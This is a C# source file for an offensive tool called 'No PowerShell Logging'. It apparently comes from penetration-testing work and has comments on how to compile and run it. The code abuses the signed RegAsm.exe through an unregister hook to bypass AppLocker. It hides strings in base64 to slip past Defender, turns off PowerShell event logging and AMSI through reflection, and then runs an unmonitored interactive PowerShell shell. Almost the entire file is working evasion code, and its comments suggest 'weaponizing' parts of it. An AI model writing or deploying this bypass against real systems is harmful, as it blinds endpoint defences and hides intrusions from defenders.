using System;
using System.IO;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Reflection;
using System.Text;
using System.Linq;
using System.Globalization;
using System.Collections.Generic;
using System.EnterpriseServices;
using System.Runtime.InteropServices;

/*
Author: Reigning Shells

Derived From: https://github.com/Ben0xA/nps
              https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs

This is npl or No PowerShell Logging.  Completely derived from others' work, 
just a way to illustrate how to entirely bypass PowerShell logging and AMSI.  
This is not intended to be used as is on anything other than a simple one-off 
penetration test.  For a real long term engagement only the necessary functionality
should be extracted from this and weaponized.

npl-regasm.cs is an AppLocker bypass with simple obfuscation of strings to bypass 
Defender's checks for AMSI and PowerShell logging bypasses.  Can be run via the
Microsoft signed executable RegAsm.exe

How to compile:
===============
c:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /reference:C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\system.management.automation.dll /target:library /out:npl-regasm.dll npl-regasm.cs

How to use:
============
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe /U .\npl-regasm.dll
*/

namespace npl
{
    public class npl : ServicedComponent
    {

        [ComUnregisterFunction] //This executes if registration fails
        public static void UnRegisterClass(string key)
        {
            Go();
        }
        
        private static void Go()
        {
            PowerShell ps = PowerShell.Create();

            // Disable Logging
            String myType = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFQAcgBhAGMAaQBuAGcALgBQAFMARQB0AHcATABvAGcAUAByAG8AdgBpAGQAZQByAA=="));
            String myField = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("ZQB0AHcAUAByAG8AdgBpAGQAZQByAA=="));
            var x = ps.GetType().Assembly.GetType(myType);
            if (x != null)
            {
                var y = x.GetField(myField, BindingFlags.NonPublic | BindingFlags.Static);
                var z = new System.Diagnostics.Eventing.EventProvider(Guid.NewGuid());
                y.SetValue(null, z);
            }

            // Disable AMSI
            myType = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA=="));
            myField = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=="));
            x = ps.GetType().Assembly.GetType(myType);
            if (x != null)
            {
                x.GetField(myField, BindingFlags.NonPublic | BindingFlags.Static).SetValue(null, true);
            }

            List<string> history = new List<string>();

            while (true)
            {
                ps.AddScript("pwd");
                string pwd = ps.Invoke()[0].ToString();
                string prompt = "PS " + pwd + "> ";

                string input = TabableReadLine(ps, prompt, pwd, history);

                if (string.IsNullOrEmpty(input))
                {
                    continue;
                }

                if (input.ToLower() == "exit")
                {
                    break;
                }

                history.Add(input);

                Invoke(ps, input);
                ps.Commands.Clear();
            }
        }
        
        private static string TabableReadLine(PowerShell ps, string prompt, string pwd, List<string> history)
        {
            int historyPointer = history.Count();
            Console.Write(prompt);

            var builder = new StringBuilder();
            var input = Console.ReadKey(intercept: true);

            while (input.Key != ConsoleKey.Enter)
            {
                var currentInput = builder.ToString();

                switch (input.Key)
                {
                    case ConsoleKey.Tab:

                        var currentParams = currentInput.Split(' ');
                        string currentParam = currentParams[currentParams.Length - 1];

                        // Get matching PowerShell cmdlets
                        ps.AddScript("Get-Command -name \"" + currentParam + "*\" | Select name | Out-String");
                        PSObject output = ps.Invoke()[0];
                        string[] names = Array.FindAll(output.ToString().Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None), x => x.StartsWith(currentParam));

                        // Get matching directories/files in current directory
                        var data = Directory.EnumerateFileSystemEntries(pwd, "*").Select(Path.GetFileName);
                        var matches = data.Where(item => item != currentParam && item.StartsWith(currentParam, true, CultureInfo.InvariantCulture));

                        // Combine lists of cmdlets and directories/files 
                        matches = names.Concat(matches);

                        if (matches != null && matches.Any())
                        {
                            if (matches.Count() == 1)
                            {
                                currentParams[currentParams.Length - 1] = matches.First();
                            }
                            else
                            {
                                Console.WriteLine("");
                                foreach (string match in matches)
                                {
                                    Console.WriteLine(match);
                                }
                            }
                        }
                        else
                        {
                            input = Console.ReadKey(intercept: true);
                            continue;
                        }

                        string currentCmd = string.Join(" ", currentParams, 0, currentParams.Length);

                        builder.Clear();
                        builder.Append(currentCmd);

                        ClearCurrentLine(prompt);
                        Console.Write(currentCmd);

                        break;
                    case ConsoleKey.Backspace:
                        if (currentInput.Length > 0)
                        {
                            builder.Remove(builder.Length - 1, 1);
                            ClearCurrentLine(prompt);
                            Console.Write(builder.ToString());
                        }
                        else
                        {
                            ClearCurrentLine(prompt);
                        }
                        break;
                    case ConsoleKey.LeftArrow:
                        if (builder.Length > 0)
                        {
                            builder.Remove(builder.Length - 1, 1);
                            Console.SetCursorPosition(prompt.Length + currentInput.Length - 1, Console.CursorTop);
                            ClearCurrentLine(prompt);
                            Console.Write(builder.ToString());
                        }
                        break;
                    case ConsoleKey.UpArrow:
                        if (historyPointer > 0)
                        {
                            historyPointer -= 1;
                            builder.Clear();
                            builder.Append(history[historyPointer]);
                            ClearCurrentLine(prompt);
                            Console.Write(builder.ToString());
                        }
                        break;
                    case ConsoleKey.DownArrow:
                        if (historyPointer < history.Count() - 1)
                        {
                            historyPointer += 1;
                            builder.Clear();
                            builder.Append(history[historyPointer]);
                            ClearCurrentLine(prompt);
                            Console.Write(builder.ToString());
                        }
                        break;
                    default:
                        var key = input.KeyChar;
                        builder.Append(key);
                        Console.Write(key);
                        break;
                }

                input = Console.ReadKey(intercept: true);
            }
            Console.WriteLine(input.KeyChar);
            return builder.ToString();
        }

        private static void ClearCurrentLine(string currentPrompt)
        {
            Console.SetCursorPosition(0, Console.CursorTop);
            Console.Write(currentPrompt.PadRight(Console.WindowWidth - currentPrompt.Length, ' '));
            Console.SetCursorPosition(currentPrompt.Length, Console.CursorTop);
        }

        private static void Invoke(PowerShell ps, string input)
        {
            string script = input + " 2>&1 | Out-String";
            ps.AddScript(script);
            Collection<PSObject> output = null;

            try
            {
                output = ps.Invoke();
            }
            catch (Exception e)
            {
                Console.WriteLine("Error while executing the script.\r\n" + e.Message.ToString());
            }
            if (output != null && output.Count > 0)
            {
                string[] lines = output[0].ToString().Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
                foreach (string line in lines)
                {
                    Console.WriteLine(line.TrimEnd());
                }
            }
        }
    }
}
